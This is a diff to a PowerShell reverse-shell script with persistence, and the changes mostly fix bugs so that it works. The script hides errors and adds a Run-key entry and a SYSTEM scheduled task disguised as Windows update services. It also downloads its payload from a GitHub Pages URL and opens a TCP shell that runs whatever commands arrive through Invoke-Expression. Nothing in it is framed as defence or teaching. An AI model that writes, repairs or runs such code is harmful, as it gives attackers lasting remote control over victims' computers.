@@ -1,5 +1,5 @@
 # ============================================
-# FIXED REVERSE SHELL WITH PERSISTENCE
+# COMPLETELY FIXED REVERSE SHELL WITH PERSISTENCE
 # ============================================
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -28,14 +28,13 @@ $persistencePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $persistenceName = "WindowsUpdateService"
 $payloadFile = "$env:TEMP\svcupdate.ps1"
 
-# Get current script content (handle IEX execution)
+# Get current script content (handle IEX execution where $PSCommandPath is empty)
 if ($PSCommandPath -ne "") {
     $scriptContent = Get-Content $PSCommandPath -Raw
 } else {
-    # When run via IEX, $PSCommandPath is empty
-    # So we download the file again for persistence
+    # When run via IEX, $PSCommandPath is empty, so download the file again
     $wc = New-Object Net.WebClient
-    $scriptContent = $wc.DownloadString('https://yourfatherx82.github.io/MY_WEBSITE/payloads/payload_fixed.ps1')
+    $scriptContent = $wc.DownloadString('https://yourfatherx82.github.io/MY_WEBSITE/payloads/payload.ps1')
 }
 
 # Save to temp for persistence
@@ -50,26 +49,24 @@ $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 Register-ScheduledTask -TaskName "WinUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force
 
-# 3. FIXED REVERSE SHELL (with proper error handling)
-Write-Host "Connecting to $ip:$port..." -ForegroundColor Green
+# 3. FIXED REVERSE SHELL (with retry logic)
+# FIXED: Use ${ip} and ${port} to avoid variable parsing issues
+Write-Host "Connecting to ${ip}:${port}..." -ForegroundColor Green
 
-# Try multiple times with retry
 $maxRetries = 3
 $retry = 0
 
 while ($retry -lt $maxRetries) {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient($ip, $port, 5000)
+        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
         $stream = $client.GetStream()
         $bytes = New-Object byte[] 1024
-        # FIXED: Use proper UTF8Encoding
         $encoding = New-Object System.Text.UTF8Encoding
         $reader = New-Object System.IO.StreamReader($stream, $encoding)
         
         Write-Host "Connected successfully!" -ForegroundColor Green
         
         while ($client.Connected -and $client.Client.Connected) {
-            $stream.Position = 0
             $data = $reader.ReadLine()
             if ($data) {
                 $execute = Invoke-Expression $data 2>&1 | Out-String
@@ -83,7 +80,7 @@ while ($retry -lt $maxRetries) {
         break
     } catch {
         $retry++
-        Write-Host "Connection attempt $retry failed. Retrying..." -ForegroundColor Yellow
+        Write-Host "Connection attempt ${retry} failed. Retrying..." -ForegroundColor Yellow
         Start-Sleep -Seconds 2
     }
 }
